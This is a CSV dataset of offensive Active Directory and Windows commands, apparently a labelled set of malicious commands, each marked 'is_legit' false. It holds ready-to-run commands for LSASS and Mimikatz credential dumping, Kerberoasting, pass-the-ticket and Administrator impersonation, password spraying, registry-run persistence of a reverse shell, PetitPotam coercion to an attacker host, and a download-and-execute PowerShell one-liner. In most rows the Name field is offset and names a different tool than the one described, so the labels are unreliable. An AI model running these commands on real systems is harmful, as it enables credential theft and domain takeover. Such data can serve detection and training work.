"Name","description","command","items","OS","attack_types","references","services","is_legit"
"winPEAS","winpeas.exe is a script that will search for all possible paths to escalate privileges on Windows hosts. The below command will run all priv esc checks and store the output in a file.  Command Reference:  	Run all checks: cmd  	Output File: output.txt","winpeas.exe cmd > output.txt","Shell","Windows","PrivEsc","[''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS''-|-''https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md''-|-''https://book.hacktricks.xyz/windows/windows-local-privilege-escalation'']","","false"
"targetedKerberoast","targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print ""kerberoast"" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the ""kerberoast"" hash, and delete the temporary SPN set for that operation.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/ShutdownRepo/targetedKerberoast","[''Kerberos''-|-''NTLM'']","false"
"lsassy-credsdump","enum4linux-ng is a modern reimplementation of enum4linux written in Python3. It is used to enumerate information from Windows and Samba systems, providing cleaner output and better support for modern protocols. The following command performs a full unauthenticated enumeration of the target.  Command Reference:  	Target IP: 10.10.10.1","enum4linux-ng 10.10.10.1","No_Creds","Linux","Enumeration","https://github.com/cddmp/enum4linux-ng","SMB","false"
"enum4linux-ng","windapsearch enumerates users, groups, and computers from a Windows domain through LDAP queries. The following command enumerates all 3 of the above mentioned using provided credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Enum Users: -U  	Enum Groups: -G  	Enum Domain Admins: --da  	Enum members of group: -m ""Remote Desktop Users""  	Enum Computers and resolve DNS: -C -r","python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m ""Remote Desktop Users"" -C -r","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ropnop/windapsearch''-|-''https://www.attackdebris.com/?p=470'']","","false"
"bloodyAD-Wite-Properties","Snaffler is a tool used to enumerate sensitive data (passwords, PII, etc.) from file shares in Active Directory. It searches for interesting files based on file extensions, file names, and file content that's matched against regex. It's also highly configurable, allowing you to add your own regex searches. The following command will enumerate all machines in the domain and search for accessible file shares, checking for interesting files that might have sensitive data.  Command Reference:  	Domain: test.local  	Domain Controller: 10.10.10.1","Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1","Shell","Windows","Enumeration","https://github.com/SnaffCon/Snaffler","SMB","false"
"Windapsearch","SharpWMI.exe is part of the GhostPack suite of tools that provides WMI functionality, such as local/remote WMI queries, remote WMI process creation, and remote execution of arbitrary VBS through WMI events. The following command will simply list all processes running on the local system.  Command Reference:  	Get all processes: ""select * from win32_process""","SharpWMI.exe action=query query=""select * from win32_process""","Shell","Windows","Persistence","[''https://github.com/GhostPack/SharpWMI''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","WMI","false"
"Snaffler","SharpUp.exe is part of the GhostPack suite of tools and is a C# port of PowerUp that will perform numerous privilege escalation checks. The following command will run all priv esc checks and store the output in a file.  Command Reference:  	Output File: output.txt","SharpUp.exe > output.txt","Shell","Windows","PrivEsc","[''https://github.com/GhostPack/SharpUp''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpWMI","SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\john /pass:password123","[''Password''-|-''Username'']","Windows","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/csharp","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"SharpUp","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	Output File: output.zip","SharpHound.exe --CollectionMethods All --ZipFileName output.zip","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","","false"
"SharpLDAPmonitor","SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and will use the provided LDAP credentials when performing LDAP collection methods, and stores the output in a zip file that can be directly placed in the BloodHound GUI.  Command Reference:  	LDAP Username: john  	LDAP Password: password123  	Output File: output.zip","SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip","[''Shell''-|-''Username''-|-''Password'']","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/BloodHoundAD/SharpHound3''-|-''https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html'']","LDAP","false"
"SharpHound","SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.","SharpDump.exe","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SharpDump''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpHound-LDAP","Seatbelt.exe is part of the GhostPack suite of tools that will perform a lot of ""safety checks"" on the Windows host and collect system data that could be useful for potential privilege escalation or persistence methods. The following command will run all checks on the system and store the output in a file (WARNING: will collect a lot of data. remove `-full` for less output).  Command Reference:  	Run all checks: -group=all  	Output File: output.txt","Seatbelt.exe -group=all -full > output.txt","Shell","Windows","[''PrivEsc''-|-''Persistence'']","[''https://github.com/GhostPack/Seatbelt''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpDump","SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process. Safetykatz also supports a number of mimikatz native commands such as ""sekurlsa::evasive-keys"" etc. The evasive switch in lab and production enviroments up to windows 2016 has been noted to successfully run where the non ""evasive"" switches had not","safetykatz.exe ""privilege::debug"" ""sekurlsa::evasive-logonpasswords"" ""exit""","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SafetyKatz''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"Seatbelt","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, using valid credentials.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -L","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SafetyKatz","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, without credentials (null session).  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt","python3 smbmap.py --host-file smb-hosts.txt -d test.local -L","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for files and filenames containing the keyword 'password'.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -F password","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","smbclient -L \\test.local -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBMap-Enum-File","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local","smbclient -L \\test.local -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target ip using user John hash on test domain.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","[''Username''-|-''Hash'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: C$  	Username: john  	Password: password123","smbclient \\\\test.local\\C$ -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-List-Share-PTH","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `public` using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: public","smbclient \\\\test.local\\public -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-Enum-Share","Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service specified since SPNs are stored in plaintext and thus access any service on the target system as any user  Command Reference:  	Domain: test.local    SPN: time/dc.test.local    alternative service: ldap(can chose any valid services such as HTTP for remoting access)  	Username: john$  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local /altservice:ldap /ptt","[''Hash''-|-''Username''-|-''target''-|-''service'']","Windows","[''Exploitation''-|-''Lateral Movement''-|-''Privilidge Escalation'']","[''https://github.com/GhostPack/Rubeus''-|-''https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation''-|-''https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation'']","Kerberos","false"
"SMBClient-Enum-Share-Anonymous","Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe kerberoast /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#kerberoast'']","Kerberos","false"
"Rubeus-s4u","Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of usernames and a list of passwords.  Command Reference:  	Domain: test.local  	Username List: usernames.txt  	Password List: passwords.txt  	Output File: found_passwords.txt","Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt","No_Creds","Windows","Enumeration","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#brute'']","Kerberos","false"
"Rubeus-Kerberoast","Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt","[''Hash''-|-''Username'']","Windows","Exploitation","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asktgt'']","Kerberos","false"
"Rubeus-Brute","Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asreproast'']","Kerberos","false"
"Rubeus-AskTGT","Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB. The following command will put Responder in analyze mode, listening for NBT-NS, BROWSER, and LLMNR requests without responding.  Command Reference:  	Interface: eth0","Responder -I eth0 -A","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/lgandx/Responder''-|-''https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/'']","[''NTLM''-|-''SMB'']","false"
"Rubeus-ASREPRoast","It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload during logon or startup. Keys added to the HKLM hive will execute on startup. Keys added to the HKCU hive will execute when the corresponding user logs on. Adding keys into the HKLM hive will require an elevated shell. There are four keys that can be used: Run, RunOnce, RunServices, and RunServicesOnce. By default, a RunOnce key is deleted after the specified command is executed. The path for these keys is the same for the HKLM and HKCU hives.  Command Reference:  	Value Name: Persistence  	RegKey data type: REG_SZ  	Data: ""C:\Path\To\revshell.exe""  	KeyName: ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run""","reg.exe add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""  reg.exe add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""","Shell","Windows","Persistence","[''https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/''-|-''https://www.hackingarticles.in/windows-persistence-using-winlogon/''-|-''https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg''-|-''https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key'']","","false"
"Responder-Analyze","rpcclient is a tool used for executing client side MS-RPC functions to manage Windows NT clients from Unix workstatios. From an offensive security standpoint, it can be used to enumerate users, groups, and other potentially sensitive information. The following command attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions.  Command Reference:  	Target IP: 10.10.10.1","rpcclient -U '' -N 10.10.10.1","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html''-|-''https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging'']","RPC","false"
"Regexe-Persistence","pyWhisker is a tool allowing users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object. It's based on Impacket and on our Python equivalent of Michael Grafnetter's DSInternals called PyDSInternals. This tool, along with Dirk-jan's PKINITtools allow for a complete primitive exploitation on UNIX-based systems only.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 pywhisker.py -d ""test.local"" -u ""john"" -p ""password123"" --target ""user2"" --action ""list"" --dc-ip ""10.10.10.1""","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/shutdownrepo/pywhisker","Kerberos","false"
"RPCClient-Anonymous","ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","Linux","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/python","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"PyWhisker","These commands provide a quick refernece for using the AD module to get situational awerness of the AD environment. Note that to get more commands that you can run, use the get command cmdlet, e.g. `Get-Command -Module ActiveDirectory` But Thes are the standard commands that will get you standard. Feel free to replace the first pipe with the -server ""your domain"" if you dont want to enumarate the entire forest. For more info on using the AD module, please check out our discussion on the AD module in WADCOMs.","#Getting all DCs in the forest (Get-ADForest).Domains | % { Get-ADDomainController -DomainName $_ -Discover }  #Getting all users in the forest (Get-ADForest).Domains | % { Get-ADUser -Filter * -Server $_ }  #Getting all computers in the forest (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Server $_ }  #Mapping out entire trust relationships Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' | Select-Object Source,Target,Name  #Getting all groups in a domain. Note that the select statement will limit the output to only the matching fields the object contains Get-ADGroup -Filter * | Select-Object SamAccountName, GroupScope, DistinguishedName","","Windows","Enumeration","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule'']","","false"
"PyLDAPmonitor","Having imported the pwsh AD module referenced in the project, we can begin to use it to enumerate for potential points of exploit one of the prime being kerberos delegation attacks. The following 4 line commands will enumerate the entire AD forest for RBCD, Constrained and Unconstrained delegation attacks. Note that we will also factor in protocol trainsiton as those change the attack vector slightly. See references below","# 1. Unconstrained (turned on for all Domain controllers by default) (Get-ADForest).Domains | % { Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,SamAccountName }   # 2. Constrained (with protocol transition check) (Get-ADForest).Domains | % { Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo; Get-ADUser -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo }  # 3. RBCD (which object is already configured) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity -Server $_ | ? {$_.""msDS-AllowedToActOnBehalfOfOtherIdentity""} | select Name,DNSHostName }  # 4. RBCD (which object can configure it - write access) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties nTSecurityDescriptor -Server $_ | ? {$_.nTSecurityDescriptor.Access | ? {$_.ActiveDirectoryRights -match ""GenericWrite|WriteProperty"" -and $_.IdentityReference -notmatch ""SYSTEM|Domain Admins""}} | select Name }","PowerShell","Windows","Enumeration","[''https://redfoxsec.com/blog/attacking-kerberos-delegation/''-|-''https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html''-|-''https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/''-|-''https://github.com/samratashok/ADModule'']","","false"
"PwshADmodule-Initial-Enum","The Active Directory Module from powershell can be used to preform most needed enumaration tasks as well as some exploitation tasks revoling around ACL/DACL/Delegation abuse. The modules does not need to be installed on the target, it is signed by microsoft and thus greatly reduces the risk of detection and lastly works without restriction in constrained language mode(CLM). This entry focused on downloading and importing it in memory for a given session, one liners can be found in other entries of WADCOMs","iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory","","Windows","[''Discovery''-|-''Credential Access'']","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule''-|-''https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'']","","false"
"PwshADmodule-DelegationAttack-Enum","PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/topotam/PetitPotam''-|-''https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory'']","[''RPC''-|-''NTLM'']","false"
"Powershell-ADModule-enum","Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and then attempting to crack those hashes offline.  This one liner using the powershell AD module serves less as a feasiable attack and more as a PoC that the AD module with some ingenuity can be used to exploit many vectors within AD that you otherwise import tools that are not signed, need obfiscation, require AV/EDR bypass or other steps that may trigger alerts.","Get-ADUser -Filter {ServicePrincipalName -ne ""$null"" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output ""===== $account : $spn =====`n$ticketBase64"" } | Out-File -FilePath ""kerberos_tickets.txt"" -Encoding ASCII","powershell","Windows","Exploitation","https://github.com/samratashok/ADModule","Kerberos","false"
"PetitPotam","PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.  Command Reference:    Domain: test.local    Host that you got the certificate from: DC01    PFX file: crt.pfx    PFX file password: password123    TGT requested: out.ccache","python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache","[''Username''-|-''Password''-|-''PFX'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PSADmodule-Kerbaroasting","PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.  Command Reference:    Domain: test.local    Host that you got the TGT from: DC01    TGT from gettgtpkinit.py: out.ccache    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","TGT","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PKINIT-gettgtpkinit","Nmap's `krb5-enum-users` script attempts to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username List: usernames.txt","nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://nmap.org/download.html''-|-''https://nmap.org/nsedoc/scripts/krb5-enum-users.html'']","[''Kerberos''-|-''Enumeration'']","false"
"PKINIT-getnthash","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.  Command Reference:  	Domain Controller IP: 10.10.10.1  	Username List: users.txt  	Password: password123","nxc smb 10.10.10.1 -u users.txt -p password123","Username","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"Nmap-Krb5-Enum-Users","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will execute a powershell command on the target machine if the user has Administrator privileges. using ""-x"" will execute from cmd.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' -X '$Host'","[''Username''-|-''Password'']","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-SMB-Password-Spray","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Exec-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.  Command Reference:  	SMB Hosts: smb_hosts.txt","nxc smb smb_host.txt --gen-relay-list output.txt","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using a null session.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u '' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB-Relay-List","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using anonymous access.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u 'a' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB-Null","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","LDAP","false"
"NetExec-Enum-SMB-Anonymous","""NetExec (a.k.a nxc) is a network pentesting suite that has many modules that can be listed via nxc <protocol> -L. The coerece_plus module will enumarate a target ip, dnsname, list of targets or ip range for different coherence attacks. It will indicate in the output which a target is vulnrable to. Providing you also a means for exploit by adding where your listener/reciving system is(-LISTENER=10.10.10.1) and which exploit you want it to use. The module was recently updated 7 days ago to work on the latest windows build""    Command Reference:        Target IP: 10.10.10.1        Username: john        Password: password123","nxc smb 10.10.10.1 -u john -p password123 -M coerce_plus","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Enumeration''-|-''Privilidge Escalation''-|-''Exploitation''-|-''Laterl movement'']","[''https://blog.redteam-pentesting.de/2025/windows-coercion/''-|-''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities'']","SMB","false"
